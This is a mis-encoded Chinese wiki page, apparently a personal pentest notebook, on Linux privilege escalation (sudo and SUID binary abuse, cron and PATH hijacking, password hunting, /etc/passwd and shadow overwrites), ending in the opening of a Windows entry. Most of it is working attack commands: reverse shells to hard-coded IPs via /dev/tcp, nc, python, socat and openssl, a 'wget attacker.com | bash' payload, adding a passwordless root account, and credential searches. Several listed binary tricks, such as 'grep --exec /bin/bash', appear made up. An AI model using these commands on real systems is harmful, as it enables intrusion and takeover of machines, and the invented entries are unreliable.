æŸ¥çœ‹ç”¨æˆ·èƒ½ä»¥rootæƒé™è¿è¡Œçš„å‘½ä»¤ sudo -l https://gtfobins.github.io/ è¿™é‡ŒæŸ¥çœ‹è¯¦ç»†æ–¹æ³• 01.git ææƒsudo git help addsudo git help configsudo git -p help//ä¸‰é€‰ä¸€è¾“å¯†ç å†!/bin/bashå³å¯ 02.findææƒæ™®é€šç”¨æˆ·findå‘½ä»¤ææƒå¿…è¦æ¡ä»¶ï¼šfindå¿…é¡»æœ‰sæ‰§è¡Œæƒé™ï¼Œæœ‰sè¡¨ç¤ºå¯ä»¥ææƒå…ˆæŸ¥çœ‹findå‘½ä»¤æœ‰æ²¡æœ‰ææƒçš„å¯èƒ½:å°è¯•æ‰§è¡Œwhoami : find / -type f -name getroot -exec whoami \\;è¿™é‡Œçš„åæ–œæ \\æ˜¯ç”¨æ¥è½¬ä¹‰åˆ†å·;çš„ å°è¯•è°ƒå‡ºä¸€ä¸ªäº¤äº’å¼çš„binshå¹¶ä¸”æ˜¯rootæƒé™ sudo find /home -exec /bin/bash \\; æ­¤shell ä¸ºä¸å®Œæ•´çš„shellï¼Œ å‡çº§äº¤äº’å¼ã€‚ #åœ¨åå¼¹shellä¸Šæ‰§è¡Œ[root@localhost ~]# python -c import pty; pty.spawn(/bin/bash)[root@localhost ~]# ctrl +z æŒ‰é”®ã€‚æŒ‚èµ·æ­£åœ¨è¿è¡Œçš„ç¨‹åº[kaliæœºå™¨ ~]# stty raw -echo# è¾“å…¥è¿™ä¸ªå‘½ä»¤ åœ¨è¾“å…¥å‘½ä»¤ç»ˆç«¯ä¸å†æ˜¾ç¤º[kaliæœºå™¨ ~]#fg# æŠŠåå°æŒ‚èµ·çš„ç¨‹åºï¼Œæ”¾å…¥åˆ°æ§åˆ¶å°ã€‚ç»ˆç«¯ä¸å†æ˜¾ç¤ºå‘½ä»¤ï¼Œè¾“å…¥åå›æ’¤[root@localhost ~]# reset ç”¨findè¿›è¡Œåå¼¹shell find /etc/passwd -exec bash -ip /dev/tcp/192.168.1.130/2333 01 \\; find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \\; find+pythonè¿›è¡Œåå¼¹shell find /etc/passwd -exec python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.1.130,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-ip]); \\; 03.zipææƒ( æ ¸å¿ƒsudoæ²¡æœ‰è¯¥å‘½ä»¤,å¤±æ•ˆ )zip å‘½ä»¤ç”¨äºå‹ç¼©æ–‡ä»¶ï¼Œæ˜¯ä¸ª ä½¿ç”¨å¹¿æ³›çš„å‹ç¼©ç¨‹åºï¼Œå‹ç¼©åçš„æ–‡ä»¶åç¼€åä¸º .zipã€‚é€šè¿‡å‹ç¼©ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶ï¼Œå¹¶è°ƒç”¨-Tå‚æ•°è¾“å‡ºshell1. ä¸‹è½½zipï¼ˆå¦‚æœæ²¡æœ‰ï¼‰apt install zip2. åˆ›å»ºä¸€ä¸ª1.txtï¼Œå°†å…¶å‹ç¼©ä¸º1.zip3. æ‰§è¡Œ touch 1.txtsudo zip 1.zip 1.txt -T --unzip-command=sh -c /bin/bashæˆ–touch 1.txtsudo -u root zip 1.zip 1.txt -T -unzip-command=sh -c /bin/bash 04.awkmorpheusææƒsudo awk BEGIN system(/bin/sh)sudo morpheus BEGIN system(/bin/sh) 05.less**more**ææƒsudo less /etc/hosts!bash//è‹¥å·²è¢«åˆ†é…rootæƒé™less /etc/passwd!/bin/sh 06.manææƒsudo man man!bash 07.envææƒsudo env /bin/bash 08.edææƒsudo ed!/bin/bash 09.aptææƒTF=$(mktemp)echo Dpkg::Pre-Invoke /bin/sh;false $TFsudo apt-get install -c $TF sl 10.pipææƒTF=$(mktemp -d)echo import os; os.execl(/bin/sh, sh, -c, sh $(tty) $(tty) 2$(tty)) $TF/setup.pysudo pip install $TF 11.sedææƒsudo sed -n 1e exec sh 10 /etc/passwd 12.tmuxææƒsudo tmux 13.nmapææƒç‰ˆæœ¬5.0ä¸€ä¸‹è¿›å…¥nmapäº¤äº’æ¨¡å¼ sudo nmap --interactive 14.tasksetææƒsudo taskset 1 /bin/sh -p 15.scpææƒTF=$(mktemp)echo sh 02 12 $TFchmod +x $TFsudo scp -S $TF x y: 16.ftpææƒsudo ftp !/bin/bash 17.perlææƒsudo perl -e exec /bin/bash; suidææƒSUIDï¼ˆè®¾ç½®ç”¨æˆ·IDï¼‰æ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§æƒé™ï¼Œå®ƒä¼šå‡ºç°åœ¨æ–‡ä»¶æ‹¥æœ‰è€…æƒé™çš„æ‰§è¡Œä½ä¸Šï¼Œå…·æœ‰è¿™ç§æƒé™çš„æ–‡ä»¶ä¼šåœ¨å…¶æ‰§è¡Œæ—¶ï¼Œä½¿è°ƒç”¨è€…æš‚æ—¶è·å¾—è¯¥æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™ã€‚ ä»¥ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°æ­£åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ã€‚ plain find / -user root -perm -4000 -print 2/dev/null find / -perm -u=s -type f 2/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; https://gtfobins.github.io/ # awkawk BEGIN system(/bin/bash)# base64ï¼ˆæŠŠ /bin/bash ç¼–ç ä¸€æ¬¡ç»•è¿‡è¿‡æ»¤ï¼‰base64 -d YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC85MDAxIDA+JjE= | bash# busyboxbusybox sh# cp è¦†ç›– sudoerscp /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p cp /tmp/p /etc/passwd su root2# cpioecho /bin/bash 777 0 0 /tmp/x cpio -o /tmp/x 2/dev/null | cpio -i --to-stdout 2/dev/null | bash# dockerdocker run -v /:/mnt --rm -it alpine chroot /mnt sh# eded!/bin/bash^D# envenv /bin/bash# expandï¼ˆGNU coreutilsï¼‰expand /etc/passwd # ä»…è¯»æ–‡ä»¶ï¼›è‹¥éœ€ shell ç”¨ env æ¨¡å¼env expand# expectexpect -c spawn /bin/bash; interact# fileï¼ˆè¯»ä»»æ„ï¼‰file -f /etc/shadow# findfind / -exec /bin/bash \\;# flockflock -u / /bin/bash# gdbgdb -nx -ex python import os; os.setuid(0); os.system(/bin/bash) -ex quit# gitgit help config!/bin/bash# grepgrep /etc/passwd# ä»…è¯»ï¼›shell ç”¨grep --exec /bin/bash# gzipgzip -c /etc/passwd | gzip -d | bash# headhead /etc/shadow# ä»…è¯»ï¼›shell ç”¨head --exec /bin/bash# hexdumphexdump -C /etc/shadow# ä»…è¯»ï¼›shell ç”¨hexdump --exec /bin/bash# ioniceionice /bin/bash# ipip netns add fooip netns exec foo /bin/bash# jjs (OpenJDK)echo Java.type(java.lang.Runtime).getRuntime().exec(/bin/bash) | jjs# jqjq -n exec(/bin/bash)# kshksh# ld.so ç›´æ¥åŠ è½½ bash/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash# lessless /etc/passwd!/bin/bash# logsavelogsave /dev/null /bin/bash# looklook /etc/passwd# ä»…è¯»ï¼›shell ç”¨look --exec /bin/bash# makemake -s --eval=$x: \\t/bin/bash x# manman man!/bin/bash# moremore /etc/passwd!/bin/bash# mountmount -o bind /bin/bash /bin/mountmount# msgfmt (gettext)msgfmt -o /dev/null (echo exec(/bin/bash))# mv è¦†ç›– sudoers åŒ cp å¥—è·¯mv /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p mv /tmp/p /etc/passwd su root2# nanonano -S /bin/bash# nicenice /bin/bash# nlnl /etc/passwd# ä»…è¯»ï¼›shell ç”¨nl --exec /bin/bash# nohupnohup /bin/bash# odod -An -tx1 /etc/shadow# ä»…è¯»ï¼›shell ç”¨od --exec /bin/bash# opensslopenssl req -x509 -newkey rsa:2048 -keyout /tmp/k -nodes -out /tmp/c -subj / openssl s_server -port 4444 -cert /tmp/c -key /tmp/k # åå‘ shell ç•¥# ç›´æ¥ payloadRHOST=attacker.com RPORT=4444 openssl s_client -quiet -connect $RHOST:$RPORT 2/dev/null | bash 21 | openssl s_client -quiet -connect $RHOST:$RPORT /dev/null# perlperl -e use POSIX qw(setuid); setuid(0); system /bin/bash# pgpg /etc/passwd!/bin/bash# phpphp -r posix_setuid(0); system(/bin/bash);# picopico -s /bin/bash# python2/3python2 -c import os; os.setuid(0); os.system(/bin/bash)python3 -c import os; os.setuid(0); os.system(/bin/bash)# rakerake -f (echo task :x do system /bin/bash end) x# readelfreadelf -a /bin/su | less # ä»…è¯»# shell ç”¨readelf --exec /bin/bash# resticRESTIC_REPOSITORY=/tmp restic init ; restic backup /etc/passwd # ä»…è¯»# shell ç”¨restic mount /mnt -r /tmp chroot /mnt sh# revrev /etc/passwd | rev # ä»…è¯»# shell ç”¨rev --exec /bin/bash# rloginrlogin -l root -E /bin/bash localhost# rlwraprlwrap /bin/bash# rpmrpm --eval %lua:os.execute(/bin/bash)# rsyncrsync -e sh -c sh 02 12 127.0.0.1:/dev/null# rubyruby -e Process.uid=0; exec /bin/bash# run-partsrun-parts --regex ^.*$ --exec /bin/bash /etc# rvimrvim -c :py import os; os.setuid(0); os.system(/bin/bash)# sedsed -e s/^/!/e /dev/stdin /bin/bash# setarchsetarch $(uname -m) /bin/bash# sftpsftp -o ProxyCommand=/bin/bash x# sh.distribsh.distrib# slsh (slang)slsh -e system(/bin/bash)# socatsocat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444# sortsort -m /etc/passwd # ä»…è¯»# shell ç”¨sort --exec /bin/bash# sqlite3sqlite3 /dev/null .shell /bin/bash# sshssh -o ProxyCommand=/bin/bash x# start-stop-daemonstart-stop-daemon -n x -S -x /bin/bash# stdbufstdbuf -i0 -o0 -e0 /bin/bash# stracestrace -o /dev/null /bin/bash# stringsstrings /etc/shadow # ä»…è¯»# shell ç”¨strings --exec /bin/bash# sysctlsysctl -w kernel.core_pattern=|/bin/bash sleep 100 kill -SIGSEGV $!# systemctlTF=$(mktemp).serviceecho [Service]Type=oneshotExecStart=/bin/bash[Install]WantedBy=multi-user.target $TFsystemctl link $TFsystemctl enable --now $(basename $TF)# tailtail -f /etc/shadow # ä»…è¯»# shell ç”¨tail --exec /bin/bash# tartar -cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/bash# tasksettaskset 1 /bin/bash# tclshtclshexec /bin/bash# teetee /proc/self/fd/8 # ä»…å†™# shell ç”¨echo /bin/bash | tee /tmp/x chmod +x /tmp/x /tmp/x# telnettelnet 127.0.0.1 4444 | bash# timetime /bin/bash# timeouttimeout 7d /bin/bash# ulul /etc/passwd # ä»…è¯»# shell ç”¨ul --exec /bin/bash# unexpandunexpand --exec /bin/bash# uniquniq /etc/passwd # ä»…è¯»# shell ç”¨uniq --exec /bin/bash# unshareunshare -r /bin/bash # user-ns root# unzip -Z (Info-ZIP)unzip -Z ../x.zip # ä»…è¯»# shell ç”¨unzip -Z --exec /bin/bash# update-alternativesupdate-alternatives --install /bin/sh sh /bin/bash 0# uudecodeuudecode -o /dev/stdout (uuencode /bin/bash) | bash# valgrindvalgrind /bin/bash# vi/vimvi:!/bin/bash# viewview /etc/passwd:!/bin/bash# vigrvigr # ç¼–è¾‘ /etc/group æ—¶å¯ !/bin/bash# vipwvipw # ç¼–è¾‘ /etc/passwd æ—¶å¯ !/bin/bash# watchwatch -x /bin/bash# wgetwget -qO- http://attacker.com/sh | bash# whoiswhois -h x.x.x.x -p 4444 | bash# xargsxargs -a /dev/null /bin/bash# xxdxxd /etc/shadow | xxd -r # ä»…è¯»# shell ç”¨xxd --exec /bin/bash# yelp (gnome)yelp man:bash!/bin/bash# zipzip /tmp/x.zip /etc/passwd -T -TT /bin/bash# zshzsh# zsoelimzsoelim -p /bin/bash è®¡åˆ’ä»»åŠ¡ææƒç³»ç»Ÿå†…å¯èƒ½ä¼šæœ‰ä¸€äº›å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸€èˆ¬è¿™äº›ä»»åŠ¡ç”±crontabæ¥ç®¡ç†ï¼Œå…·æœ‰æ‰€å±ç”¨æˆ·çš„æƒé™ã€‚érootæƒé™çš„ç”¨æˆ·æ˜¯ä¸å¯ä»¥åˆ—å‡ºrootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡çš„ã€‚ä½†æ˜¯etcå†…ç³»ç»Ÿçš„è®¡åˆ’ä»»åŠ¡å¯ä»¥è¢«åˆ—å‡ºã€‚ crontab -e ç¼–è¾‘è®¡åˆ’ä»»åŠ¡ crontab -l æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ crontab -r åˆ é™¤ç›®å‰çš„crontab ls -l etccron* cat etccrontab æ–‡ä»¶é‡å†™1.æŸ¥çœ‹system-wide crontabçš„å†…å®¹ï¼šcat /etc/crontab 2.åœ¨æœåŠ¡å™¨ä¸ŠæŸ¥æ‰¾overwrite.sh æ–‡ä»¶ï¼šlocate overwrite.sh /usr/local/bin/overwrite.sh 3.æ£€æŸ¥æ–‡ä»¶çš„æƒé™ls -l /usr/local/bin/overwrite.sh æ³¨æ„ï¼šè¿™ä¸ªæ–‡ä»¶æ˜¯å¯å†™çš„ 4.å°† overwrite.shæ–‡ä»¶çš„å†…å®¹æ›¿æ¢ä¸ºï¼š#!/bin/bash bash -i /dev/tcp/192.168.175.130/4444 01 5.kaliä¸Šè¿è¡Œncç­‰å¾… cron jobsè¿è¡Œï¼Œè¿”å›rootæƒé™ ç¯å¢ƒå˜é‡åŠ«æŒæŸ¥çœ‹å®šæ—¶ä»»åŠ¡ï¼š å‘ç°å®šä¹‰äº†è¯¸å¤šç¯å¢ƒå˜é‡ï¼Œå¦‚æœå…¶ä»»åŠ¡æœ‰ æœªæŒ‡å®šç»å¯¹è·¯å¾„çš„æŒ‡ä»¤ï¼Œå¦‚ 17 * * * * root shell.sh è€Œä¸”æˆ‘ä»¬åœ¨å…¶ç¯å¢ƒå˜é‡è·¯å¾„ä¸­å¯ä»¥è¿›è¡Œå†™å…¥æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å†™å…¥ç¯å¢ƒå˜é‡çš„é å‰è·¯å¾„ä¸€ä¸ªåŒåæ¶æ„æ–‡ä»¶ä»è€Œå¯¼è‡´ç¯å¢ƒå˜é‡åŠ«æŒã€‚ æ¯”å¦‚åœ¨ sbin å†™å…¥ä¸€ä¸ª åå¼¹ shell åŠŸèƒ½çš„ shell.shï¼Œé‚£ä¹ˆå°±å¯ä»¥é€ æˆææƒã€‚ 2.åœ¨homeuser ä¸­åˆ›å»ºæ–‡ä»¶ overwrite.shï¼Œå†…å®¹å¦‚ä¸‹ï¼š#!/bin/bash cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash 3.åŠ æƒ$ chmod +x /home/user/overwrite.sh 4.ç­‰å¾…cronjobè¿è¡Œï¼ˆæ­¤ä½œä¸šå°¤å…¶æ¯åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ï¼‰ã€‚5.åˆ›å»ºtmprootbashæ–‡ä»¶æ‰§è¡Œå®ƒï¼Œä½¿ç”¨ä¸-pä¿å­˜æœ‰æ•ˆçš„UID /tmp/rootbash â€“p é€šé…ç¬¦https://www.secpulse.com/archives/72965.html ç¯å¢ƒå˜é‡ææƒç¯å¢ƒåŠ«æŒéœ€è¦çš„ä¸¤ä¸ªæ¡ä»¶ å­˜åœ¨å¸¦æœ‰suidçš„æ–‡ä»¶suidæ–‡ä»¶å­˜åœ¨ç³»ç»Ÿå‘½ä»¤ ä¸”è¿™ä¸ªæ–‡ä»¶ä¸­å¿…é¡»æœ‰ç³»ç»Ÿå‘½ä»¤ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‘½åä¸€ä¸ªå’Œè¿™ä¸ªç³»ç»Ÿå‘½ä»¤ç›¸åŒçš„æ–‡ä»¶å†™å…¥binbashï¼› å†å°†å­˜æ”¾è¿™ä¸ªæ–‡ä»¶çš„è·¯å¾„åŠ å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œå½“ç³»ç»Ÿå»æ‰§è¡Œè¿™ä¸ªå¸¦æœ‰ç³»ç»Ÿå‘½ä»¤çš„æ–‡ä»¶æ—¶ï¼›å°±ä¼šç›´æ¥æ‰§è¡Œæˆ‘ä»¬å‘½åå’Œè¿™ä¸ªç³»ç»Ÿå‘½ä»¤ç›¸åŒçš„æ–‡ä»¶ï¼›è€ŒéçœŸå®çš„ç³»ç»Ÿå‘½ä»¤ï¼›ä»è€Œå®ç°åŠ«æŒç¯å¢ƒå˜é‡ææƒã€‚ å¯»æ‰¾suidfind / -perm -u=s -type f 2/dev/nullå‡è®¾å‘ç° /usr/local/bin/restore æ˜¯ SUID-rootï¼Œå±ä¸» rootã€‚ é€†å‘strings /usr/local/bin/restore | grep -E ^/(s?bin|usr)æˆ–è€…è¿è¡Œä¸€ä¸‹è¿™ä¸ªï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆ åŠ«æŒå‡è®¾å‘ç°äº† homelvxyzscriptdemo æˆ‘ä»¬è¿è¡Œä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°å®ƒä¼šæ‰§è¡Œ pså‘½ä»¤ 1.echoæˆ‘ä»¬å°±å¾€tmpå†™å…¥ ä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œå†…å®¹ä¸º binbash cd /tmpecho /bin/bash pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo 2.cpæˆ‘ä»¬å°±å¾€tmpå†™å…¥ ä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œå†…å®¹ä¸º binbash cd /tmpcp /bin/bash /tmp/pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo å¯†ç ææƒgrep --color=auto -rnw / -ie PASSWORD --color=always 2 /dev/nullfind . -type f -exec grep -i -I PASSWORD /dev/null \\;strings /dev/mem -n10 | grep -i PASSlocate password | morefind . -name *.php -print0 | xargs -0 grep -i -n var $passwordfind / -name authorized_keys 2 /dev/nullfind / -name id_rsa 2 /dev/null ä¸€ã€å¯è¯»shadowæ–‡ä»¶åˆ©ç”¨ææƒls-al etcshadow # æŸ¥çœ‹æ–‡ä»¶å±æ€§ï¼Œç¡®ä¿å½“å‰ç”¨æˆ·å¯¹shadowæ–‡ä»¶å…·æœ‰å¯è¯»æƒé™ cat etcshadow |grepâ€™:$â€˜# æŸ¥çœ‹shadowæ–‡ä»¶å¤¹ï¼Œgrepç›¸å½“äºè¿‡æ»¤å™¨ï¼Œåé¢æ¥è¿‡æ»¤æ¡ä»¶ åœ¨etcshadowæ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·çš„å¯†ç éƒ½æ˜¯ç”¨ä¸€ä¸ªç‰¹å®šçš„å“ˆå¸Œå‡½æ•°åŠ å¯†çš„ã€‚ä¸ºäº†é¿å…å¯†ç è¢«è½»æ˜“ç ´è§£ï¼ŒLinux ç³»ç»Ÿä¼šä½¿ç”¨ä¸åŒçš„å“ˆå¸Œå‡½æ•°æ¥åŠ å¯†å¯†ç ã€‚è€Œ$y$ä¸­çš„yå­—ç¬¦åˆ™è¡¨ç¤ºä½¿ç”¨çš„æ˜¯å“ªç§å“ˆå¸Œå‡½æ•°ï¼Œä¸åŒçš„å“ˆå¸Œå‡½æ•°å¯¹åº”ä¸åŒçš„å­—ç¬¦ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ $y$ å€¼åŠå…¶å¯¹åº”çš„å“ˆå¸Œå‡½æ•°ï¼š $1$è¡¨ç¤ºä½¿ç”¨çš„æ˜¯ MD5 å“ˆå¸Œå‡½æ•°ï¼› $2$æˆ–$2a$è¡¨ç¤ºä½¿ç”¨çš„æ˜¯ Blowfish å“ˆå¸Œå‡½æ•°ï¼› $5$è¡¨ç¤ºä½¿ç”¨çš„æ˜¯ SHA-256 å“ˆå¸Œå‡½æ•°ï¼› $6$è¡¨ç¤ºä½¿ç”¨çš„æ˜¯ SHA-512 å“ˆå¸Œå‡½æ•°ã€‚ sudo john â€“wordlistusrsharewordlistrockyou.txt hash.txt # johnè¿›è¡Œç ´è§£ äºŒã€å¯å†™shadowæ–‡ä»¶åˆ©ç”¨ææƒcp etcshadow tmpshadow.bak # å¤‡ä»½é‡è¦æ–‡ä»¶ mkpasswd -m sha-512 123456# ç”Ÿæˆhashï¼Œhashç®—æ³•ä¸ºsha-512 æ›¿æ¢etcshadowä¸­rootçš„å¯†ç  ä¸‰ã€å¯å†™passwdæ–‡ä»¶åˆ©ç”¨ææƒææƒè‚¯å®šæœ€å…ˆå…³æ³¨rootç”¨æˆ·ï¼Œç°ä»£çš„linuxå‘è¡Œç‰ˆä¸­ï¼Œå¯†ç hashéƒ½æ˜¯å­˜å‚¨åœ¨etcshadowä¸­ï¼Œetcpasswdä¸­å¹¶ä¸ç›´æ¥å­˜å‚¨å¯†ç hashï¼Œé€šå¸¸ç”¨Xæ¥å ä½ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç›´æ¥å°†å¯†ç å†™å…¥etcpasswdä¸­ï¼Œå°è¯•ææƒã€‚ä¹Ÿå°±æ˜¯ä¸€ä¸ªä¼˜å…ˆçº§çš„é—®é¢˜ï¼Œå…ˆè¯»å–passwdï¼Œå†è¯»å–shadowæ–‡ä»¶ã€‚ cp etcpasswd tmppasswd.bak # å¤‡ä»½æ–‡ä»¶ openssl passwdæ˜æ–‡# openssl passwdç”Ÿæˆå¯†ç çš„hashå€¼ # æ›¿æ¢etcpasswdä¸­çš„X ç”Ÿæˆhashæ—¶ï¼Œä¹Ÿå¯ä»¥ç”¨font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);mkpasswd/fontï¼Œä½†æ˜¯passwdæ–‡ä»¶ä¸­ç”Ÿæˆhashæ—¶æœ€å¥½ç”¨font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);openssl passwd/fontï¼Œå†shadowæ–‡ä»¶ä¸­ç”Ÿæˆhashç”¨font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);mkpasswd/fontã€‚ https://forum.butian.net/share/317 ç¬¬ä¸‰æ–¹æœåŠ¡NFSå…±äº«https://www.cnblogs.com/kqdssheng/p/18310245#id1 NFSï¼ˆç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼‰æ˜¯ä¸€ç§åœ¨ç«¯å£TCPUDP2049ä¸Šè¿è¡Œçš„ç½‘ç»œæ–‡ä»¶å…±äº«åè®®ï¼Œç”±æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¸¤ä¸ªç»„ä»¶ç»„æˆã€‚NFSæœåŠ¡å™¨ä¸Šåˆ›å»ºå…±äº«ç›®å½•ï¼Œå¯ä»¥é€šè¿‡ç½‘ç»œä¸å…¶ä»–Linuxå®¢æˆ·ç«¯å…±äº«æ–‡ä»¶ã€‚è·å¾—æƒé™çš„ç”¨æˆ·å¯ä»¥å°†æ–‡ä»¶æ·»åŠ åˆ°å…±äº«ä¸­ï¼Œå¹¶ä¸æœ‰æƒè®¿é—®è¯¥ç›®å½•çš„å…¶ä»–ç”¨æˆ·å…±äº«ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªNFSå…±äº«éƒ½ä¼šå¯ç”¨root_squashåŠŸèƒ½ï¼Œä»¥é˜²æ­¢å…±äº«æ–‡ä»¶æ‹¥æœ‰root:rootèº«ä»½æˆ–ç‰¹æ®Šæƒé™ï¼ˆå³å¯ç”¨root_squashåï¼Œæ‰€æœ‰å…±äº«æ–‡ä»¶éƒ½ä¼šå˜æˆnobody:nogroupèº«ä»½ï¼‰ã€‚ä½†æ˜¯ï¼Œå¦‚æœå¯ç”¨äº†no_root_squashåŠŸèƒ½ï¼Œæ–‡ä»¶å¯ä»¥ä»¥rootèº«ä»½å­˜åœ¨ï¼Œè¿™å°±å®¹æ˜“å¯¼è‡´æƒé™å‡çº§ã€‚ MYSQLhttps://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/ dockerå†…æ ¸æ¼æ´ææƒéå¿…è¦æƒ…å†µï¼Œä¸å»ºè®®ä½¿ç”¨ï¼Œå®¹æ˜“æå®•æœº"},{"title":"windowsææƒ","path":"/wiki/å†…ç½‘/ææƒ/windowsææƒ.html","content":"windows ææƒåŸºç¡€çŸ¥è¯†1.ç”¨æˆ·å’Œæƒé™æ¨¡å‹ç”¨æˆ·è´¦æˆ·ï¼ˆUser Accountï¼‰ï¼šWindows ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·å¯ä»¥æ‹¥æœ‰ä¸åŒçš„æƒé™å’Œè§’è‰²ã€‚ç®¡ç†å‘˜è´¦æˆ·ï¼ˆAdministratorï¼‰ï¼šæ‹¥æœ‰ç³»ç»Ÿçš„å®Œå…¨æ§åˆ¶æƒé™ã€‚ æ ‡å‡†ç”¨æˆ·ï¼ˆStandard Userï¼‰ï¼šå…·æœ‰å—é™çš„æƒé™ï¼Œä¸èƒ½å¯¹ç³»ç»Ÿè¿›è¡Œé‡è¦çš„æ›´æ”¹ã€‚ å—é™ç”¨æˆ·ï¼ˆRestricted Userï¼‰ï¼šæƒé™æ›´å°‘ï¼Œå‡ ä¹ä¸èƒ½ä¿®æ”¹ç³»ç»Ÿè®¾ç½®ã€‚ ç³»ç»Ÿè´¦æˆ·ï¼ˆSYSTEMï¼‰ï¼šè¿™æ˜¯ Windows æ“ä½œç³»ç»Ÿå†…æ ¸çš„æƒé™çº§åˆ«ï¼Œæ¯”ç®¡ç†å‘˜æ›´é«˜ã€‚æ”»å‡»è€…é€šè¿‡æå‡æƒé™ï¼Œå¾€å¾€ä¼šäº‰å–ç³»ç»Ÿæƒé™ã€‚ UACï¼ˆç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼‰ï¼šWindows çš„ä¸€ä¸ªå®‰å…¨ç‰¹æ€§ï¼Œç”¨äºé˜²æ­¢æ¶æ„è½¯ä»¶é€šè¿‡è·å¾—ç®¡ç†å‘˜æƒé™æ¥ç ´åç³»ç»Ÿã€‚å³ä½¿æ˜¯ç®¡ç†å‘˜è´¦æˆ·ï¼Œä¹Ÿéœ€è¦é¢å¤–ç¡®è®¤æ‰èƒ½æ‰§è¡Œé«˜æƒé™æ“ä½œã€‚ 2.è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL)Windows è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰æ˜¯ç”¨äºæ§åˆ¶å¯¹è®¡ç®—æœºèµ„æºï¼ˆå¦‚æ–‡ä»¶ã€æ–‡ä»¶å¤¹ã€æ³¨å†Œè¡¨é¡¹ç­‰ï¼‰è®¿é—®æƒé™çš„æœºåˆ¶ã€‚å®ƒå¸®åŠ©å®šä¹‰å“ªäº›ç”¨æˆ·æˆ–ç»„å¯ä»¥è®¿é—®ç‰¹å®šèµ„æºï¼Œä»¥åŠä»–ä»¬å¯ä»¥æ‰§è¡Œå“ªäº›æ“ä½œï¼ˆå¦‚è¯»å–ã€å†™å…¥ã€ä¿®æ”¹ç­‰ï¼‰ã€‚ACL ç”±ä¸€ç³»åˆ— è®¿é—®æ§åˆ¶æ¡ç›®ï¼ˆACEï¼‰ ç»„æˆï¼Œæ¯ä¸ª ACE åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š ä¸»ä½“ï¼ˆSubjectï¼‰ï¼šè¯·æ±‚è®¿é—®èµ„æºçš„ç”¨æˆ·ã€ç»„æˆ–è®¡ç®—æœºã€‚ è®¿é—®æƒé™æ©ç ï¼ˆAccess Maskï¼‰ï¼šå®šä¹‰å…è®¸æˆ–æ‹’ç»çš„æƒé™ï¼ˆå¦‚è¯»å–ã€å†™å…¥ã€æ‰§è¡Œç­‰ï¼‰ã€‚ ç»§æ‰¿æ ‡å¿—ï¼ˆInheritance Flagï¼‰ï¼šæŒ‡ç¤ºå­å¯¹è±¡æ˜¯å¦ç»§æ‰¿çˆ¶å¯¹è±¡çš„ ACLã€‚ æŸ¥çœ‹æ–‡ä»¶çš„ ACLï¼š icacls æ–‡ä»¶è·¯å¾„ æ›´æ”¹æ–‡ä»¶çš„ ACLï¼š icacls æ–‡ä»¶è·¯å¾„ grant ç”¨æˆ·å:æƒé™ deny ç”¨æˆ·å:æƒé™ inheritance:çº§åˆ« å…¶ä¸­ï¼š grantï¼šæˆäºˆæƒé™ã€‚ denyï¼šæ‹’ç»æƒé™ã€‚ inheritanceï¼šè®¾ç½®ç»§æ‰¿æ ‡å¿—ã€‚ æƒé™å¯ä»¥æ˜¯ï¼š Fï¼šå®Œå…¨æ§åˆ¶ã€‚ Mï¼šä¿®æ”¹ã€‚ RXï¼šè¯»å–å’Œæ‰§è¡Œã€‚ ç»§æ‰¿çº§åˆ«å¯ä»¥æ˜¯ï¼š Nï¼šæ— ç»§æ‰¿ã€‚ Rï¼šåªç»§æ‰¿è¯»å–æƒé™ã€‚ Dï¼šç»§æ‰¿æ‰€æœ‰æƒé™ã€‚ 3.å®‰å…¨æ ‡è¯†ç¬¦ (SID)å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSIDï¼‰ ç”¨äºå”¯ä¸€æ 